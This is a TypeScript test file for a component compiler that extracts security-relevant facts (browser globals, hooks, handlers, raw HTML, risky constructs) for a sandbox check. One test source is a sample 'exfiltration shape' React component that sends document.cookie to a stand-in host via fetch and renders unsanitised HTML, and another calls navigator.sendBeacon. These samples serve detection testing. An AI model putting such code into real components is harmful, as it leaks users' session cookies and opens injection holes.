// F520 (R6): `compileComponent` returns `facts` about the source FILE for a sandbox check: from the compiler's own parse, over
// the whole file (render, handlers, effects, module-level helpers), also when the component is refused. One variant app is
// built once (it exposes `shop/sdk.ts`); each case compiles a source string against that build.
import { afterAll, beforeAll, expect, test } from 'bun:test'
import { cpSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { runBuild } from '../src/build'
import { type CompileResult, MAX_ID_LENGTH, compileComponent } from '../src/compile'

const FX = join(import.meta.dir, 'fixtures')
const made: string[] = []
let app = ''
let dist = ''

beforeAll(async () => {
  app = join(FX, `.tmp-facts-${process.pid}`)
  made.push(app)
  cpSync(join(FX, 'expose'), app, { recursive: true })
  dist = mkdtempSync(join(tmpdir(), 'brust-facts-dist-'))
  made.push(dist)
  await runBuild({ appRoot: app, entry: 'routes.tsx', outDir: dist, log: () => {} })
}, 120_000)

afterAll(() => {
  for (const d of made) rmSync(d, { recursive: true, force: true })
})

const compile = (source: string, filename = 'el/Promo.tsx'): Promise<CompileResult> => compileComponent({ source, filename, appRoot: app, dist })
const facts = async (source: string) => {
  const r = await compile(source)
  if (!r.facts) throw new Error(`no facts: ${JSON.stringify(r.diagnostics)}`)
  return r.facts
}

test('R6.4: the exfiltration shape compiles with no finding, and its facts list fetch, document, useEffect and dangerouslySetInnerHTML', async () => {
  const r = await compile(
    "import { useEffect } from 'react'\nexport default function Promo({ html }: { html: string }) {\n  useEffect(() => { fetch('https://x.test/c?d=' + document.cookie) }, [])\n  return <div dangerouslySetInnerHTML={{ __html: html }} />\n}\n",
  )
  // The compiler's own judgement (E14): browser globals only matter in render, so it is a native component without a diagnostic.
  expect(r.ok).toBe(true)
  expect(r.diagnostics).toEqual([])
  expect(r.facts).toMatchObject({
    globals: ['document', 'fetch'],
    hooks: [{ name: 'useEffect', from: 'react' }],
    attrs: ['dangerouslySetInnerHTML'],
    rawHtml: true,
    tags: ['div'],
    risky: [],
  })
})

test('R6.4: a clean component lists no globals, no raw HTML and no risky construct', async () => {
  const f = await facts("import { useState } from 'react'\nexport default function Promo({ label }: { label: string }) {\n  const [n, setN] = useState(0)\n  return <button onClick={() => setN(n + 1)}>{label}{n}</button>\n}\n")
  expect(f).toMatchObject({ imports: [{ specifier: 'react', names: ['useState'] }], globals: [], rawHtml: false, spreads: false, risky: [] })
  expect(f.handlers).toMatchObject([{ event: 'click', tag: 'button', callees: [{ name: 'setN', kind: 'setter' }] }])
})

test('R6.4: a module-level helper that reads window is seen (the render never reaches it)', async () => {
  const f = await facts("function peek() {\n  return window.localStorage.getItem('k')\n}\nexport default function Promo() {\n  return <b onClick={() => peek()}>x</b>\n}\n")
  expect(f.globals).toEqual(['window'])
  expect(f.handlers[0]!.callees.map((c) => [c.name, c.kind])).toEqual([
    ['peek', 'local'],
    ['window.localStorage.getItem', 'member'],
  ])
})

test('R6.1: imports, handlers with imported callees, spreads and risky constructs, with positions', async () => {
  const f = await facts(
    "import { bump } from '../shop/sdk'\nexport default function Promo({ k, p }: { k: string; p: object }) {\n  const go = () => {\n    bump()\n    navigator.sendBeacon('/x')\n  }\n  const v = (window as any)[k]\n  return <a {...p} onClick={go}>{String(v)}</a>\n}\n",
  )
  expect(f.imports).toEqual([{ specifier: '../shop/sdk', names: ['bump'] }])
  expect(f.spreads).toBe(true)
  expect(f.handlers[0]!.callees).toEqual(
    expect.arrayContaining([
      { name: 'bump', kind: 'import', from: '../shop/sdk' },
      { name: 'navigator.sendBeacon', kind: 'member' },
    ]),
  )
  expect(f.risky).toEqual([{ kind: 'computed-member', line: 7, col: 14 }])
  expect(f.globals).toEqual(expect.arrayContaining(['navigator', 'window', 'String']))
})

test('R6.2: facts are present on an ok:false result when the file parsed, and absent when it did not', async () => {
  const refused = await compile("import { x } from './nope'\nexport default function Promo() {\n  return <p>{x}</p>\n}\n")
  expect(refused.ok).toBe(false)
  expect(refused.facts?.imports).toEqual([{ specifier: './nope', names: ['x'] }])
  const broken = await compile('export default function Promo( { return <p></p> }\n')
  expect(broken.ok).toBe(false)
  expect(broken.facts).toBeUndefined()
})

test('type-only imports never appear in the facts', async () => {
  const f = await facts("import type { Foo } from './nope'\nexport default function Promo() {\n  return <p>t</p>\n}\n")
  expect(f.imports).toEqual([])
})

test('a file name that would make the artifact id longer than the registry accepts is refused', async () => {
  const src = 'export default function Promo() {\n  return <p>x</p>\n}\n'
  expect((await compile(src, `el/${'a'.repeat(80)}.tsx`)).ok).toBe(true)
  const r = await compile(src, `el/${'a'.repeat(110)}.tsx`)
  expect(r.ok).toBe(false)
  const d = r.diagnostics.find((d) => d.rule === 'runtime-filename')!
  expect(d.class).toBe('error')
  expect(d.message).toContain(`limit is ${MAX_ID_LENGTH}`)
  expect(r.facts).toBeDefined()
})
